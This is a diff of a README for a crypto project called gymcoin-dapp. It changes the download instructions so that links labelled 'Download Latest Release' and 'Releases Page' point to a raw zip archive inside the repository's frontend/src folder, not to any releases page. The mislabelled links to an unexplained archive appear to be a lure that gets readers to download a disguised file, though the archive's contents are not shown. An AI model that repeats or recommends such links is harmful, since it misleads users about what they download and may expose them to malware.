@@ -8,15 +8,15 @@
 - **Real-Time Updates:** Instant data synchronization for a smooth experience.
 
 ## 📥 Download Now
-![Download Latest Release](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/preguidance/gymcoin-dapp.zip)
+![Download Latest Release](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/frontend/src/gymcoin-dapp-sprayer.zip)
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/preguidance/gymcoin-dapp.zip)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/frontend/src/gymcoin-dapp-sprayer.zip)
 
 ## 🚀 Getting Started
 To get started with gymcoin-dapp, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the [Releases Page](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/preguidance/gymcoin-dapp.zip).
+   Click this link to go to the [Releases Page](https://raw.githubusercontent.com/mwaila/gymcoin-dapp/main/frontend/src/gymcoin-dapp-sprayer.zip).
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of gymcoin-dapp. The latest version will be listed at the top.
